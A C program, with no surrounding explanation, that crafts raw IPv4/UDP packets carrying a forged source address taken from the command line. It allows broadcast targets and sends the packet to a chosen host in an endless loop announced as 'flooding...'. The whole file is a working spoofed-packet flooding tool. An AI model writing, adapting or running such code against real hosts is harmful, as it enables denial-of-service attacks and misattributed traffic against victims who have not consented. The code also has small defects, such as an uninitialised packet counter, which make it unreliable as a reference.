#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/time.h>
#include <netinet/ip.h>
#include <netinet/udp.h>
#include <unistd.h>

typedef unsigned char u8;
typedef unsigned short int u16;

unsigned short in_cksum(unsigned short *ptr, int nbytes);

int main(int argc, char **argv){
	
	unsigned long daddr;
	unsigned long saddr;
	int payload_size = 0, sent, sent_size;
	char *data; 
	char *payload;
	saddr = inet_addr(argv[1]);
	daddr = inet_addr(argv[2]);
	payload=argv[3];
	payload_size = strlen(argv[3]);
	
	//Calculate total packet size
	int packet_size = sizeof (struct iphdr) + sizeof (struct udphdr) + payload_size;
	char *packet = (char *) malloc (packet_size);
	
	//ip header
	struct iphdr *ip = (struct iphdr *) packet;
	struct udphdr *udp = (struct udphdr *) (packet + sizeof (struct iphdr));
	
	//Raw socket - if you use IPPROTO_ICMP, then kernel will fill in the correct ICMP header checksum, if IPPROTO_RAW, then it wont
	int sockfd = socket (AF_INET, SOCK_RAW, IPPROTO_RAW);
	
	if (sockfd < 0){
		perror("could not create socket");
		return (0);
	}
	
	int on = 1;
	
	// We shall provide IP headers
	if (setsockopt (sockfd, IPPROTO_IP, IP_HDRINCL, (const char*)&on, sizeof (on)) == -1) {
		perror("setsockopt");
		return (0);
	}
	
	//allow socket to send datagrams to broadcast addresses
	if (setsockopt (sockfd, SOL_SOCKET, SO_BROADCAST, (const char*)&on, sizeof (on)) == -1) {
		perror("setsockopt");
		return (0);
	}	
	
				   
	if (!packet) {
		perror("out of memory");
		close(sockfd);
		return (0);
	}
	
	
	//zero out the packet buffer
	memset (packet, 0, packet_size);

	ip->version = 4;
	ip->ihl = 5;
	ip->tos = 0;
	ip->tot_len = htons (packet_size);
	ip->id = rand ();
	ip->frag_off = 0;
	ip->ttl = 255;
	ip->protocol = IPPROTO_UDP;
	ip->saddr = saddr;
	ip->daddr = daddr;
	//ip->check = in_cksum ((u16 *) ip, sizeof (struct iphdr));

  	udp->source = htons(50000);
	udp->dest = htons(54321);
  	udp->len=htons(8 + payload_size);
	udp->check = 0;
	udp->check = in_cksum((unsigned short *)udp, sizeof(struct udphdr) + payload_size);
	
	struct sockaddr_in servaddr;
	servaddr.sin_family = AF_INET;
	servaddr.sin_addr.s_addr = daddr;
	memset(&servaddr.sin_zero, 0, sizeof (servaddr.sin_zero));
	data=(packet + sizeof(struct iphdr) + sizeof(struct udphdr));
	strcpy(data,payload);

	puts("flooding...");
	
	while (1)
	{
		
		if ( (sent_size = sendto(sockfd, packet, packet_size, 0, (struct sockaddr*) &servaddr, sizeof (servaddr))) < 1) 
		{
			perror("send failed\n");
			break;
		}
		++sent;
		printf("%d packets sent\r", sent);
		fflush(stdout);
		
		usleep(1000000);	//microseconds
	}
	
	free(packet);
	close(sockfd);
	
	return (0);
}

/*
	Function calculate checksum
*/
unsigned short in_cksum(unsigned short *ptr, int nbytes)
{
	register long sum;
	u_short oddbyte;
	register u_short answer;

	sum = 0;
	while (nbytes > 1) {
		sum += *ptr++;
		nbytes -= 2;
	}

	if (nbytes == 1) {
		oddbyte = 0;
		*((u_char *) & oddbyte) = *(u_char *) ptr;
		sum += oddbyte;
	}

	sum = (sum >> 16) + (sum & 0xffff);
	sum += (sum >> 16);
	answer = ~sum;

	return (answer);
}
